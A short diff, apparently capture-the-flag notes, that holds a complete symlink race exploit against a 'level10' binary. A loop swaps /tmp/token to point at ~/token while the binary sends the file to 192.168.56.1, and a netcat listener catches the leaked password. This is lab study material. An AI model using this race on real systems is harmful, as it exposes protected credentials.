@@ -1,1 +1,7 @@
 while true; do echo ABC > /tmp/token; chmod 777 /tmp/token; ln -fs ~/token /tmp/token; rm /tmp/token ; done
+
+while true ; do ./level10 /tmp/token 192.168.56.1 ; done
+
+nc -kl 6969
+
+==> c'est le password
